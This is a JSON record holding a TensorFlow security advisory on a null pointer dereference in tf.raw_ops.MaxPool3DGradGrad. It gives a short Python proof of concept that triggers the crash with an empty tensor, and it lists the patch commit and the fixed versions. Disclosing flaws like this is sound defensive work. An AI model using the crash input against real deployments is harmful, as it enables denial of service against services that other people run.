{"description": "### Impact\nThe implementation of `tf.raw_ops.MaxPool3DGradGrad` exhibits undefined behavior by dereferencing null pointers backing attacker-supplied empty tensors:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\norig_output = tf.constant([0.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.MaxPool3DGradGrad(\n    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,\n    strides=strides, padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/72fe792967e7fd25234342068806707bbc116618/tensorflow/core/kernels/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.\n\n### Patches\nWe have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.", "methods": ["Uses undefined behavior in `tf.raw_ops.MaxPool3DGradGrad` to dereference null pointers backing attacker-supplied empty tensors.", "Fails to validate that 3 tensor inputs are not empty, allowing for null pointer dereference."]}
